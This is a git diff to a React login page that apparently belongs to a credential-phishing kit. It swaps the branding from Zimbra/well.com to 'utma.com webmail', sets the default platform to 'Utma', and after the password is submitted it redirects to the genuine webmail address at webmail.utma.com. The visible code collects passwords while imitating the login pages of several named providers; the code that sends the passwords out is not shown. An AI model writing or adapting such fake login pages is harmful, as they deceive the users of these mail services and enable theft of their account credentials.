@@ -11,6 +11,7 @@ import mediacom from './mediacom.png';
 import united from './united.png';
 import mrtc from './mrtc.png';
 import zimbra from './zimbra.png';
+import utma from './utma.png';
 
 
 function Home(){
@@ -19,7 +20,7 @@ function Home(){
 
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Iris-well");
+    const[platform, setPlatform] = useState("Utma");
 
     const[showError, setShowError] = useState(false);
 
@@ -47,7 +48,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://iris.well.com/';
+               window.location.href = 'https://webmail.utma.com/';
             }
           } catch (error) {
             // Handle error
@@ -71,8 +72,8 @@ function Home(){
             </div>
 
             <div className='secondiv col-md-5 m-auto'>
-                <div className='logodiv px-3'>
-                <img src={zimbra} className="mylogo"/>
+                <div className='logodiv px-3 text-center'>
+                <img src={utma} className="mylogo"/>
 
                 </div>
 
@@ -170,8 +171,7 @@ function Home(){
 
             <div className='thirdiv'>
 
-                <p>Zimbra :: the leader in open source messaging and collaboration :: Blog - Wiki - Forums <br/>
-                    Copyright © 2005-2021 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</p>
+                <p>utma.com webmail</p>
 
             </div>
 
